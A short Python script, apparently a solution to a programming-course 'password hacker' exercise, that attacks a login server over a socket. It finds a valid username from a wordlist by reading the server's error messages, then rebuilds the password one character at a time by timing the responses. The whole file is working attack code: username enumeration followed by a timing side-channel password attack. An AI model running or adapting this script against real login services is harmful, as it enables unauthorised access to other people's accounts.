import sys
import socket
import itertools
import os
import json
import time


def variations(password):
    return map(''.join, itertools.product(*((char.lower(), char.upper()) for char in password)))


def brute_force_password():
    address = (sys.argv[1], int(sys.argv[2]))
    logins_file_path = os.path.join(os.path.dirname(__file__), 'logins.txt')

    if not os.path.exists(logins_file_path):
        print(f"Not found: {logins_file_path}")
        return

    with socket.socket() as client_socket:
        client_socket.connect(address)

        with open(logins_file_path) as file:
            for login in file:
                login = login.strip()
                data = json.dumps({"login": login, "password": " "})
                client_socket.send(data.encode())
                response = json.loads(client_socket.recv(1024).decode())
                if response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
                    correct_login = login
                    break

        password = ""
        while True:
            max_time = 0
            next_char = ""
            for char in itertools.chain(map(chr, range(48, 58)),
                                        map(chr, range(65, 91)),
                                        map(chr, range(97, 123))):
                data = json.dumps({"login": correct_login, "password": password + char})
                start_time = time.time()
                client_socket.send(data.encode())
                response = json.loads(client_socket.recv(1024).decode())
                end_time = time.time()
                elapsed_time = end_time - start_time

                if elapsed_time > max_time:
                    max_time = elapsed_time
                    next_char = char

                if response["result"] == "Connection success!":
                    print(json.dumps({"login": correct_login, "password": password + char}))
                    return

            password += next_char


brute_force_password()